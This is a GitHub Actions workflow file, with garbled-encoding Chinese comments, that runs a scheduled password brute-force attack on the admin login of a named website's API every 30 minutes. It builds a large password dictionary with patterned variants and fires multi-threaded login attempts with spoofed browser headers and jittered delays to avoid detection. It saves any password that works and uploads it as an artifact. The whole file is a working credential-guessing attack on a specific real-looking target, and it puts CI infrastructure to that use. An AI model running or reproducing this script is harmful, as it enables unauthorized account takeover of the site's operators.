name: Password Brute Force

on:
  workflow_dispatch:  # å…è®¸æ‰‹åŠ¨è§¦å‘
  schedule:
    - cron: '*/30 * * * *'  # æ¯30åˆ†é’Ÿè¿è¡Œä¸€æ¬¡

jobs:
  brute-force:
    runs-on: ubuntu-latest
    timeout-minutes: 25  # è®¾ç½®25åˆ†é’Ÿè¶…æ—¶ï¼Œé¿å…è¢«å–æ¶ˆ
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.9'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install requests

    - name: Create password dictionary
      run: |
        # åˆ›å»ºå¸¸è§å¯†ç å­—å…¸
        cat > password_dict.txt << 'EOF'
        admin
        admin123
        admin888
        admin666
        password
        password123
        123456
        12345678
        123456789
        1234567890
        qwerty
        abc123
        letmein
        welcome
        login
        passw0rd
        admin@123
        Admin123
        Admin888
        Admin666
        zank666
        zank888
        test123
        test888
        888888
        666666
        999999
        000000
        111111
        222222
        333333
        444444
        555555
        777777
        a123456
        a888888
        admin2024
        admin2023
        admin2022
        zank2024
        zank2023
        EOF

        # æ·»åŠ æ›´å¤šå¸¸è§å¯†ç æ¨¡å¼
        for i in {1000..9999}; do
          echo "admin$i"
          echo "Admin$i"
          echo "password$i"
          echo "123456$i"
        done >> password_dict.txt

        echo "å¯†ç å­—å…¸åˆ›å»ºå®Œæˆï¼Œå…± $(wc -l < password_dict.txt) ä¸ªå¯†ç "

    - name: Create brute force script
      run: |
        cat > brute_force.py << 'EOF'
        import random
        import string
        import requests
        import json
        import time
        import os
        from concurrent.futures import ThreadPoolExecutor, as_completed

        # åŠ è½½å¯†ç å­—å…¸
        def load_password_dict():
            passwords = []
            if os.path.exists("password_dict.txt"):
                with open("password_dict.txt", "r", encoding="utf-8") as f:
                    passwords = [line.strip() for line in f if line.strip()]
            return passwords

        # éšæœºç”Ÿæˆ 6~10 ä½çš„å¯†ç ï¼ˆå­—æ¯+æ•°å­—ï¼‰
        def random_password():
            length = random.randint(6, 10)
            chars = string.ascii_letters + string.digits  # a-zA-Z0-9
            return ''.join(random.choice(chars) for _ in range(length))

        # åŸºäºå­—å…¸ç”Ÿæˆå˜ä½“å¯†ç 
        def generate_variant_passwords(base_password):
            variants = []
            
            # åŸºæœ¬å˜ä½“
            variants.append(base_password)
            variants.append(base_password.upper())
            variants.append(base_password.lower())
            variants.append(base_password.capitalize())
            
            # æ·»åŠ æ•°å­—åç¼€
            for i in range(10):
                variants.append(base_password + str(i))
                variants.append(base_password + str(i) + str(i))
            
            for i in range(100):
                variants.append(base_password + str(i).zfill(2))
            
            for i in range(1000, 1020):  # å°‘é‡å¹´ä»½åç¼€
                variants.append(base_password + str(i))
            
            # å¸¸è§æ›¿æ¢
            replaced = base_password.replace('a', '@').replace('s', '$').replace('i', '!').replace('o', '0')
            if replaced != base_password:
                variants.append(replaced)
            
            # æ·»åŠ å‰ç¼€åç¼€
            prefixes = ['', '!', '@', '#', '$', '123', '888', '666']
            suffixes = ['', '!', '@', '#', '$', '123', '888', '666', '!@#']
            
            for prefix in prefixes:
                for suffix in suffixes:
                    if prefix or suffix:
                        variants.append(prefix + base_password + suffix)
            
            return list(set(variants))  # å»é‡

        # å°è¯•ç™»å½•çš„å‡½æ•°
        def try_login(password, attempt, max_attempts, source="random"):
            url = "https://zank666api.icu/proxy/api/back/back-user/login"
            
            headers = {
                "Host": "zank666api.icu",
                "Content-Type": "application/json;charset=utf-8",
                "Origin": "https://zank666api.icu",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
                "Referer": "https://zank666api.icu/",
                "Accept-Language": "zh-CN,zh-Hans;q=0.9"
            }
            
            data = {
                "password": password,
                "userName": "admin"
            }

            try:
                # æ·»åŠ éšæœºå»¶è¿Ÿï¼Œé¿å…è¯·æ±‚è¿‡äºé¢‘ç¹
                time.sleep(random.uniform(0.2, 1.0))
                
                response = requests.post(url, headers=headers, data=json.dumps(data), timeout=15)
                print(f"[{attempt}/{max_attempts}] [{source}] å°è¯•å¯†ç : {password} | çŠ¶æ€ç : {response.status_code}")

                # æˆåŠŸåˆ¤æ–­æ¡ä»¶
                if response.status_code == 200:
                    try:
                        response_data = response.json()
                        if (response_data.get("code") == 200 or 
                            "token" in response.text.lower() or 
                            "success" in response.text.lower()):
                            print("âœ… ç™»å½•æˆåŠŸ! å¯†ç æ˜¯:", password)
                            print("å“åº”å†…å®¹:", response.text)
                            with open("password.txt", "w") as f:
                                f.write(password)
                            with open("success_log.txt", "a") as f:
                                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - æˆåŠŸå¯†ç : {password}\n")
                            return True, password
                    except json.JSONDecodeError:
                        # å¦‚æœä¸æ˜¯JSONï¼Œæ£€æŸ¥æ–‡æœ¬å†…å®¹
                        if "æˆåŠŸ" in response.text or "token" in response.text.lower():
                            print("âœ… ç™»å½•æˆåŠŸ! å¯†ç æ˜¯:", password)
                            print("å“åº”å†…å®¹:", response.text)
                            with open("password.txt", "w") as f:
                                f.write(password)
                            return True, password
                
                print(f"âŒ ç™»å½•å¤±è´¥")
                return False, None

            except requests.exceptions.RequestException as e:
                print(f"[{attempt}/{max_attempts}] è¯·æ±‚é”™è¯¯: {e}")
                return False, None

        # å¤šçº¿ç¨‹çˆ†ç ´å‡½æ•°
        def brute_force_parallel(max_attempts=100, max_workers=8):
            found = False
            correct_password = None
            
            # å…ˆå°è¯•å­—å…¸å¯†ç 
            dict_passwords = load_password_dict()
            print(f"åŠ è½½äº† {len(dict_passwords)} ä¸ªå­—å…¸å¯†ç ")
            
            # ç”Ÿæˆå˜ä½“å¯†ç 
            variant_passwords = []
            for base_pwd in dict_passwords[:100]:  # å¯¹å‰100ä¸ªåŸºç¡€å¯†ç ç”Ÿæˆå˜ä½“
                variant_passwords.extend(generate_variant_passwords(base_pwd))
            
            variant_passwords = list(set(variant_passwords))  # å»é‡
            print(f"ç”Ÿæˆäº† {len(variant_passwords)} ä¸ªå˜ä½“å¯†ç ")
            
            all_passwords = variant_passwords + dict_passwords
            random.shuffle(all_passwords)  # éšæœºæ‰“ä¹±é¡ºåº
            
            # è®¡ç®—éœ€è¦éšæœºç”Ÿæˆçš„æ•°é‡
            dict_attempts = min(len(all_passwords), max_attempts // 2)
            random_attempts = max_attempts - dict_attempts
            
            print(f"å°†å°è¯• {dict_attempts} ä¸ªå­—å…¸å¯†ç å’Œ {random_attempts} ä¸ªéšæœºå¯†ç ")
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # å…ˆå°è¯•å­—å…¸å¯†ç 
                futures = []
                attempt_count = 0
                
                for i, password in enumerate(all_passwords[:dict_attempts]):
                    attempt_count += 1
                    futures.append(executor.submit(try_login, password, attempt_count, max_attempts, "dict"))
                
                # ç„¶åå°è¯•éšæœºå¯†ç 
                for i in range(random_attempts):
                    attempt_count += 1
                    password = random_password()
                    futures.append(executor.submit(try_login, password, attempt_count, max_attempts, "random"))
                
                # å¤„ç†ç»“æœ
                for future in as_completed(futures):
                    try:
                        success, password = future.result()
                        if success:
                            found = True
                            correct_password = password
                            # å–æ¶ˆæ‰€æœ‰æœªå®Œæˆçš„ä»»åŠ¡
                            for f in futures:
                                f.cancel()
                            break
                    except Exception as e:
                        print(f"ä»»åŠ¡å¼‚å¸¸: {e}")
            
            return found, correct_password

        if __name__ == "__main__":
            print("å¼€å§‹å¯†ç çˆ†ç ´...")
            print("=" * 50)
            
            # è®°å½•å·²å°è¯•çš„å¯†ç 
            if not os.path.exists("attempted_passwords.txt"):
                with open("attempted_passwords.txt", "w") as f:
                    f.write("")
            
            # ä½¿ç”¨å¤šçº¿ç¨‹æ–¹å¼ï¼Œæ¯æ¬¡è¿è¡Œå°è¯•300æ¬¡
            start_time = time.time()
            found, password = brute_force_parallel(max_attempts=300, max_workers=10)
            end_time = time.time()
            
            print("=" * 50)
            if found:
                print(f"ğŸ‰ çˆ†ç ´æˆåŠŸ! å¯†ç æ˜¯: {password}")
                print(f"æ€»è€—æ—¶: {end_time - start_time:.2f} ç§’")
            else:
                print("âŒ æœ¬è½®çˆ†ç ´å¤±è´¥ï¼Œæœªæ‰¾åˆ°æ­£ç¡®å¯†ç ")
                print(f"æœ¬è½®å°è¯•äº†300æ¬¡å¯†ç ï¼Œè€—æ—¶: {end_time - start_time:.2f} ç§’")
                
            # ä¿å­˜å°è¯•è®°å½•
            with open("attempt_log.txt", "a") as f:
                status = "æˆåŠŸ" if found else "å¤±è´¥"
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - å°è¯•{status}, è€—æ—¶: {end_time - start_time:.2f}ç§’\n")
        EOF

    - name: Run brute force
      run: python brute_force.py

    - name: Check if password found
      id: check_password
      run: |
        if [ -f "password.txt" ]; then
          echo "PASSWORD_FOUND=true" >> $GITHUB_OUTPUT
          echo "å¯†ç å·²æ‰¾åˆ°: $(cat password.txt)"
          # å‘é€é€šçŸ¥
          echo "ğŸ‰ å¯†ç çˆ†ç ´æˆåŠŸ! å¯†ç : $(cat password.txt)" >> $GITHUB_STEP_SUMMARY
        else
          echo "PASSWORD_FOUND=false" >> $GITHUB_OUTPUT
          echo "æœ¬è½®æœªæ‰¾åˆ°å¯†ç "
          echo "âŒ æœ¬è½®çˆ†ç ´å¤±è´¥ï¼Œç»§ç»­ä¸‹ä¸€è½®..." >> $GITHUB_STEP_SUMMARY
        fi

    - name: Upload result if found
      if: steps.check_password.outputs.PASSWORD_FOUND == 'true'
      uses: actions/upload-artifact@v4
      with:
        name: password-result
        path: |
          password.txt
          success_log.txt

    - name: Upload attempt log
      uses: actions/upload-artifact@v4
      with:
        name: attempt-logs
        path: |
          attempt_log.txt
        if-no-files-found: ignore

    - name: Send notification on success
      if: steps.check_password.outputs.PASSWORD_FOUND == 'true'
      run: |
        echo "ğŸ‰ å¯†ç çˆ†ç ´æˆåŠŸ!"
        echo "å¯†ç : $(cat password.txt)"
        # è¿™é‡Œå¯ä»¥æ·»åŠ é‚®ä»¶ã€Slackç­‰é€šçŸ¥æ–¹å¼